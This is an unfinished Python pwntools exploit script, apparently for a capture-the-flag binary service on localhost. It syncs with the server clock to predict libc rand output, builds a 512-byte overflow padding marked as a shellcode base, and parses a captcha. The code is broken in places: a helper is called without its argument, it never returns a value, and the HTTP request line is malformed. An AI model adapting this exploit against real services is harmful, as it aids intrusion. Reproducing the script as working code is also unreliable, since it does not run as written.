#!/usr/bin/env python3


from ctypes import CDLL
from pwn import *
import numpy as np
import time
from datetime import datetime
from calendar import timegm


def get_server_time(http):
    http.send(b"GET / HTTP1.1\n\n")
    print(http.readuntil(b"Date: "))
    text_date = http.readuntilS("\n")[:-2]
    epoch = datetime(1970, 1, 1)
    utc_time = datetime.strptime(text_date, "%a, %d %b %Y %H:%M:%S %Z") - epoch

    
    print(utc_time.total_seconds())

# Set up srand and rand
libc = CDLL("libc.so.6")

# Shellcode base.
data = "A"*512 

# Start the server.
s = remote("localhost", 2020)

# Get the server time as quickly as possible.
server_time = get_server_time()



s.readuntilS("captcha : ")

# Get the captcha string, remove the newline, convert to python int.
captcha = int(s.readuntilS("\n")[:-1])

int32_captcha = np.int32(captcha)


print(f"Capcha: {captcha}")

